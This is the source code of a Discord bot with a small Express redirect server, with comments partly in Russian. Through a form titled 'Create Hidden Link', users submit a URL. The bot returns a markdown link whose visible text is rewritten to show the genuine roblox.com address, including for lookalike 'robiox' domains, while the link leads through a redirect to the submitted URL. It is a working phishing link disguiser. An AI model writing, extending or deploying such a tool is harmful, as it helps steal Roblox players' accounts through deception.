require('dotenv').config();
console.log("✅ dotenv loaded");

const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

// WEB SERVER
app.get('/', (req, res) => res.send('ok'));
app.get('/ping', (req, res) => res.send('ok'));

app.get('/r/:id', (req, res) => {
    const originalUrl = linksDb[req.params.id];
    if (originalUrl) return res.redirect(originalUrl);
    res.status(404).send('Not found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Web server on ${PORT}`));

// BOT
client.once('ready', () => {
    console.log(`✅ Bot ${client.user.tag} is ready!`);
});

client.on('interactionCreate', async (interaction) => {
    console.log(`🟢 Interaction: ${interaction.type} | ${interaction.customId || 'none'}`);

    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        console.log(`🟢 Button pressed by ${interaction.user.tag}`);

        try {
            // Самый быстрый способ
            const modal = new ModalBuilder()
                .setCustomId('link_modal')
                .setTitle('Create Hidden Link');

            const input = new TextInputBuilder()
                .setCustomId('url_input')
                .setLabel('Paste Roblox link')
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('https://www.roblox.com/...')
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(input));

            // Показываем модалку максимально быстро
            await interaction.showModal(modal);
            console.log(`✅ Modal shown successfully`);

        } catch (err) {
            console.error(`❌ SHOW MODAL ERROR:`, err.message);
            try {
                await interaction.reply({ 
                    content: "❌ Error opening form", 
                    flags: [MessageFlags.Ephemeral] 
                });
            } catch (e) {}
        }
        return;
    }

    // ==================== МОДАЛКА ====================
    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        console.log(`📝 Modal submitted by ${interaction.user.tag}`);

        try {
            const url = interaction.fields.getTextInputValue('url_input');
            const id = Math.random().toString(36).substring(7);
            linksDb[id] = url;

            const shortUrl = `${process.env.BASE_URL}/r/${id}`;
            const visualUrl = url
                .replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
                .replace('https://', 'https_:_//');

            await interaction.reply({
                content: '<a:verify:1513286049638518824> Check your DMs!',
                flags: [MessageFlags.Ephemeral]
            });

            await interaction.user.send({
                embeds: [{
                    color: 0x274666,
                    title: '🔗 Hyperlink Generated',
                    description: '👇 **Your link is ready!**\nКликни на код ниже чтобы скопировать'
                }]
            });

            await interaction.user.send({
                content: `[\`${visualUrl}\`](${shortUrl})\n\`\`\`\n${visualUrl}\n\`\`\``
            });
        } catch (err) {
            console.error('Modal processing error:', err.message);
        }
    }
});

client.login(process.env.TOKEN).catch(err => console.error("LOGIN ERROR:", err));
